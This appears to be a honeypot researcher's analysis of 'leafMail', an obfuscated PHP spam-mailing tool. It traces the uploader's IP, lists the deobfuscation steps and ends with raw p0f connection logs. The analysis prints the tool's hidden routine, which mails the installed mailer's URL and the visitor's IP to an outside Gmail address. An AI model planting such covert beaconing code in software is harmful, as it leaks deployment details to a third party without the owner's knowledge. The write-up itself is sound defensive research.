# leafMail - email spamming tool

Just another email spamming tool with a web page
front end. Seems to bill by the email sent, which
is weird, since leafMail is a wrapper around PHPMailer,
which itself is just a wrapper around PHP's `mail()` builtin.

## Origin

### IP Address

73.192.243.136.in-addr.arpa     name = monts.historicalorigins.net.

Surprise! monts.historicalorigins.net not in DNS!
Surprise! historicalorigins.net not in DNS!
Neither monts.historicalorigins.net nor historicalorigins.net in `whois`, either.

`whois` says 136.243.192.73 is a Hetzner Online IP addres, traceroute
seems to confirm  that IP address physical location is in Germany.

### Download


## Decoding

It's FOPO encoded.

1. php ~/src/php/FOPO-PHP-Deobfuscator/ver.-0.22/deobfuscator.php *file > dc1.php
2. ~/src/php/reverse-php-malware/pp.php dc1.php > f1.php

## Analysis

"LeafMail" emailer, wrapper around
class PHPMailer, '5.2.14'

Has a file upload function in addition to the email spamming part.

### Apparent bills by the email sent?

    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $bilsmg = "Link Mailer : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";
    $bilsnd = "ws64628ws@gmail.com";
    $bilsub = "New Mailer Uploaded By WS !! {$ip}";
    $bilhead = "From: Leaf_WS";
    $bilhead .= $_POST['eMailAdd'] . "\n";
    $bilhead .= "MIME-Version: 1.0\n";
    $arr = array($bilsnd, $IP);
    foreach ($arr as $bilsnd) {
        mail($bilsnd, $bilsub, $bilsmg, $bilhead, $message);
    }
[2018/02/05 08:37:32] mod=syn|cli=136.243.192.73/59632|srv=162.246.45.144/80|subj=cli|os=Windows 7 or 8|dist=13|params=fuzzy|raw_sig=4:115+13:0:1460:8192,8:mss,nop,ws,nop,nop,sok:df,id+,ecn:0
[2018/02/05 08:37:32] mod=mtu|cli=136.243.192.73/59632|srv=162.246.45.144/80|subj=cli|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:37:32] mod=syn+ack|cli=136.243.192.73/59632|srv=162.246.45.144/80|subj=srv|os=???|dist=0|params=none|raw_sig=4:64+0:0:1460:mss*20,7:mss,nop,nop,sok,nop,ws:df:0
[2018/02/05 08:37:32] mod=mtu|cli=136.243.192.73/59632|srv=162.246.45.144/80|subj=srv|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:37:32] mod=syn|cli=136.243.192.73/59633|srv=162.246.45.144/80|subj=cli|os=Windows 7 or 8|dist=13|params=fuzzy|raw_sig=4:115+13:0:1460:8192,8:mss,nop,ws,nop,nop,sok:df,id+,ecn:0
[2018/02/05 08:37:32] mod=mtu|cli=136.243.192.73/59633|srv=162.246.45.144/80|subj=cli|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:37:32] mod=syn+ack|cli=136.243.192.73/59633|srv=162.246.45.144/80|subj=srv|os=???|dist=0|params=none|raw_sig=4:64+0:0:1460:mss*20,7:mss,nop,nop,sok,nop,ws:df:0
[2018/02/05 08:37:32] mod=mtu|cli=136.243.192.73/59633|srv=162.246.45.144/80|subj=srv|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:37:32] mod=syn|cli=136.243.192.73/59634|srv=162.246.45.144/80|subj=cli|os=Windows 7 or 8|dist=13|params=fuzzy|raw_sig=4:115+13:0:1460:8192,8:mss,nop,ws,nop,nop,sok:df,id+,ecn:0
[2018/02/05 08:37:32] mod=mtu|cli=136.243.192.73/59634|srv=162.246.45.144/80|subj=cli|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:37:32] mod=syn+ack|cli=136.243.192.73/59634|srv=162.246.45.144/80|subj=srv|os=???|dist=0|params=none|raw_sig=4:64+0:0:1460:mss*20,7:mss,nop,nop,sok,nop,ws:df:0
[2018/02/05 08:37:32] mod=mtu|cli=136.243.192.73/59634|srv=162.246.45.144/80|subj=srv|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:37:32] mod=http request|cli=136.243.192.73/59632|srv=162.246.45.144/80|subj=cli|app=???|lang=English|params=none|raw_sig=1:Host,Connection=[keep-alive],User-Agent,Upgrade-Insecure-Requests=[1],Accept=[text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8],Accept-Encoding=[gzip, deflate],Accept-Language=[en-US,en;q=0.9,sq;q=0.8,ar;q=0.7]:Accept-Charset,Keep-Alive:Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
[2018/02/05 08:37:32] mod=http response|cli=136.243.192.73/59632|srv=162.246.45.144/80|subj=srv|app=Apache 2.x|lang=none|params=none|raw_sig=1:Date,Server,X-Powered-By=[PHP/7.2.2],?Content-Length,Keep-Alive=[timeout=5, max=100],Connection=[Keep-Alive],Content-Type:Accept-Ranges:Apache/2.4.29 (Unix) PHP/7.2.2
[2018/02/05 08:37:32] mod=host change|cli=136.243.192.73/59632|srv=162.246.45.144/80|subj=srv|reason=date|raw_hits=0,1,1,1
[2018/02/05 08:38:21] mod=syn|cli=136.243.192.73/59636|srv=162.246.45.144/80|subj=cli|os=Windows 7 or 8|dist=13|params=fuzzy|raw_sig=4:115+13:0:1460:8192,8:mss,nop,ws,nop,nop,sok:df,id+,ecn:0
[2018/02/05 08:38:21] mod=mtu|cli=136.243.192.73/59636|srv=162.246.45.144/80|subj=cli|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:38:21] mod=syn+ack|cli=136.243.192.73/59636|srv=162.246.45.144/80|subj=srv|os=???|dist=0|params=none|raw_sig=4:64+0:0:1460:mss*20,7:mss,nop,nop,sok,nop,ws:df:0
[2018/02/05 08:38:21] mod=mtu|cli=136.243.192.73/59636|srv=162.246.45.144/80|subj=srv|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:38:21] mod=syn|cli=136.243.192.73/59637|srv=162.246.45.144/80|subj=cli|os=Windows 7 or 8|dist=13|params=fuzzy|raw_sig=4:115+13:0:1460:8192,8:mss,nop,ws,nop,nop,sok:df,id+,ecn:0
[2018/02/05 08:38:21] mod=mtu|cli=136.243.192.73/59637|srv=162.246.45.144/80|subj=cli|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:38:21] mod=syn+ack|cli=136.243.192.73/59637|srv=162.246.45.144/80|subj=srv|os=???|dist=0|params=none|raw_sig=4:64+0:0:1460:mss*20,7:mss,nop,nop,sok,nop,ws:df:0
[2018/02/05 08:38:21] mod=mtu|cli=136.243.192.73/59637|srv=162.246.45.144/80|subj=srv|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:38:21] mod=syn|cli=136.243.192.73/59638|srv=162.246.45.144/80|subj=cli|os=Windows 7 or 8|dist=13|params=fuzzy|raw_sig=4:115+13:0:1460:8192,8:mss,nop,ws,nop,nop,sok:df,id+,ecn:0
[2018/02/05 08:38:21] mod=mtu|cli=136.243.192.73/59638|srv=162.246.45.144/80|subj=cli|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:38:21] mod=syn+ack|cli=136.243.192.73/59638|srv=162.246.45.144/80|subj=srv|os=???|dist=0|params=none|raw_sig=4:64+0:0:1460:mss*20,7:mss,nop,nop,sok,nop,ws:df:0
[2018/02/05 08:38:21] mod=mtu|cli=136.243.192.73/59638|srv=162.246.45.144/80|subj=srv|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:38:21] mod=syn|cli=136.243.192.73/59639|srv=162.246.45.144/80|subj=cli|os=Windows 7 or 8|dist=13|params=fuzzy|raw_sig=4:115+13:0:1460:8192,8:mss,nop,ws,nop,nop,sok:df,id+,ecn:0
[2018/02/05 08:38:21] mod=mtu|cli=136.243.192.73/59639|srv=162.246.45.144/80|subj=cli|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:38:21] mod=syn+ack|cli=136.243.192.73/59639|srv=162.246.45.144/80|subj=srv|os=???|dist=0|params=none|raw_sig=4:64+0:0:1460:mss*20,7:mss,nop,nop,sok,nop,ws:df:0
[2018/02/05 08:38:21] mod=mtu|cli=136.243.192.73/59639|srv=162.246.45.144/80|subj=srv|link=Ethernet or modem|raw_mtu=1500
[2018/02/05 08:38:21] mod=http request|cli=136.243.192.73/59636|srv=162.246.45.144/80|subj=cli|app=???|lang=English|params=none|raw_sig=1:Host,Connection=[keep-alive],User-Agent,Upgrade-Insecure-Requests=[1],Accept=[text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8],Accept-Encoding=[gzip, deflate],Accept-Language=[en-US,en;q=0.9,sq;q=0.8,ar;q=0.7],?Cookie:Accept-Charset,Keep-Alive:Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
[2018/02/05 08:38:21] mod=http response|cli=136.243.192.73/59636|srv=162.246.45.144/80|subj=srv|app=Apache 2.x|lang=none|params=none|raw_sig=1:Date,Server,X-Powered-By=[PHP/7.2.2],Keep-Alive=[timeout=5, max=100],Connection=[Keep-Alive],Transfer-Encoding=[chunked],Content-Type:Accept-Ranges:Apache/2.4.29 (Unix) PHP/7.2.2
[2018/02/05 08:38:21] mod=host change|cli=136.243.192.73/59636|srv=162.246.45.144/80|subj=srv|reason=date|raw_hits=0,2,2,2
[2018/02/05 08:38:29] mod=http request|cli=136.243.192.73/59637|srv=162.246.45.144/80|subj=cli|app=???|lang=English|params=none|raw_sig=1:Host,Connection=[keep-alive],?Cache-Control,User-Agent,Upgrade-Insecure-Requests=[1],Accept=[text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8],Accept-Encoding=[gzip, deflate],Accept-Language=[en-US,en;q=0.9,sq;q=0.8,ar;q=0.7],?Cookie:Accept-Charset,Keep-Alive:Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
[2018/02/05 08:38:29] mod=http response|cli=136.243.192.73/59637|srv=162.246.45.144/80|subj=srv|app=Apache 2.x|lang=none|params=none|raw_sig=1:Date,Server,X-Powered-By=[PHP/7.2.2],Keep-Alive=[timeout=5, max=100],Connection=[Keep-Alive],Transfer-Encoding=[chunked],Content-Type:Accept-Ranges:Apache/2.4.29 (Unix) PHP/7.2.2
